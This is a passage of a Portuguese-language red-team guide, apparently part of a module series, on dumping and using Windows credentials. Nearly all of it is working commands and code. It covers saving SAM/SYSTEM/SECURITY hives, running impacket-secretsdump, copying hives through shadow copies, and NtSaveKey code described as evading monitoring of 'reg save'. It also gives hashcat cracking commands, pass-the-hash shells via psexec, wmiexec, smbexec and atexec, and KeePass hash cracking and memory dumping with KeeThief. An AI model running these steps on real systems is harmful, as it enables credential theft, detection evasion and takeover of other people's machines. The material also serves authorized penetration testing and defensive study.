reg save HKLM\SECURITY C:\Temp\security.hive
```

Extrair hashes com **secretsdump**:
```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

### SAM Remote (secretsdump via SMB)

```bash
# Via credenciais admin
impacket-secretsdump DOMAIN/user:pass@target

# Via hash (PtH)
impacket-secretsdump -hashes :NTLMhash DOMAIN/user@target
```

### SAM via VSS (Shadow Copy)

Contornar lock do SAM ativo copiando via VSS:

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
```

Sem precisar de Mimikatz ou abrir registro diretamente.

### SAM via NtSaveKey (syscall direto)

```c
// Privilegio SeBackupPrivilege necessário
typedef NTSTATUS (NTAPI* NtSaveKey_t)(HANDLE hKey, HANDLE hFile);

HANDLE hSam, hFile;
RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ | REG_OPTION_BACKUP_RESTORE, &hSam);
CreateFileA("C:\\Temp\\sam.hive", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
NtSaveKey_t pNtSaveKey = GetProcAddress(GetModuleHandleA("ntdll"), "NtSaveKey");
pNtSaveKey(hSam, hFile);
```

Bypassa `reg save` (monitorado) usando NTAPI diretamente.

---

## Hashcat — Modos para Hashes Windows

| Hash type | Hashcat mode | Exemplo formato |
|-----------|-------------|----------------|
| NTLM | 1000 | `e19ccf75ee54e06b06a5907af13cef2c` |
| NetNTLMv1 | 5500 | `user::domain:challenge:lmhash:nthash` |
| NetNTLMv2 | 5600 | `user::domain:challenge:hmac_hash:blob` |
| Kerberos TGS (AS-REP) | 18200 | `$krb5asrep$23$user@dom:...` |
| Kerberos TGS (TGS-REP) | 13100 | `$krb5tgs$23$*...*$...` |
| KeePass 2.x | 13400 | `$keepass$*2*...` |
| DPAPI masterkey | 15900 | `$DPAPImk$...` |

```bash
# NTLM crack
hashcat -m 1000 hashes.txt /wordlists/rockyou.txt -r best64.rule

# NetNTLMv2 (Responder capture)
hashcat -m 5600 netntlm.txt /wordlists/rockyou.txt

# Kerberoasting
hashcat -m 13100 tgs.txt /wordlists/rockyou.txt --force
```

### Regras de Mutação Úteis

```bash
# Padrão corporativo: Senha123! → Senha2024!
hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/d3ad0ne.rule

# Combinator: "Summer" + "2024" → "Summer2024"
hashcat -m 1000 -a 1 hashes.txt seasons.txt years.txt
```

---

## Pass-the-Hash com Impacket

```bash
# psexec PtH → shell SYSTEM
impacket-psexec -hashes :e19ccf75ee54e06b06a5907af13cef2c DOMAIN/user@target cmd.exe

# wmiexec PtH → execução via WMI (mais furtiva)
impacket-wmiexec -hashes :e19ccf75ee54e06b06a5907af13cef2c DOMAIN/user@target "whoami"

# smbexec PtH → service criado e deletado
impacket-smbexec -hashes :e19ccf75ee54e06b06a5907af13cef2c DOMAIN/user@target

# atexec → task scheduler
impacket-atexec -hashes :e19ccf75ee54e06b06a5907af13cef2c DOMAIN/user@target "cmd /c whoami > C:\out.txt"
```

---

## KeePass Credential Dump

### Via arquivo .kdbx

```bash
# Extrair hash do .kdbx para crack
python3 /opt/keepass2john/keepass2john.py Database.kdbx > keepass.hash

# Crack
hashcat -m 13400 keepass.hash /wordlists/rockyou.txt

# Com master password descoberto, abrir
kpcli --kdb Database.kdbx --pw 'MasterPass'
kpcli:/> find .
kpcli:/> show -f <path>
```

### KeePass 2.x Memory Dump (KeeThief / CVE-2023-24055)

KeePass 2.x ≤ 2.53 tem trigger de processo que permite capturar master password via processo memory:

```powershell
# KeeThief (GhostPack)
Import-Module .\KeeThief.ps1
Get-KeePassDatabaseKey -Verbose
```

Lê strings do processo KeePass antes de zerar da memória.

---

## Módulos Relacionados

`01_enumeracao_e_situational_awareness.md` alimenta a decisão (`Get-MpComputerStatus` define método de dump seguro; `Get-NetLoggedon` identifica usuários com token em memória). `02_escalada_de_privilegio.md` é pré-requisito porque SYSTEM é necessário pra dump de LSASS e acesso às hives SAM/SECURITY. `04_token_impersonation.md` consome hashes obtidos aqui em `sekurlsa::pth` e PtH via make_token/impacket. `09_active_directory/03_golden_e_silver_tickets.md` consome credenciais de domínio pra forjar tickets.

---

## Leitura Complementar

- Mimikatz — https://github.com/gentilkiwi/mimikatz
- Impacket — https://github.com/SecureAuthCorp/impacket
- Nanodump — https://github.com/helpsystems/nanodump
- HandleKatz — https://github.com/codewhitesec/HandleKatz
- SharpChrome — https://github.com/djhohnstein/SharpChrome
- LaZagne — https://github.com/AlessandroZ/LaZagne
- LAPSToolkit — https://github.com/leoloobeek/LAPSToolkit
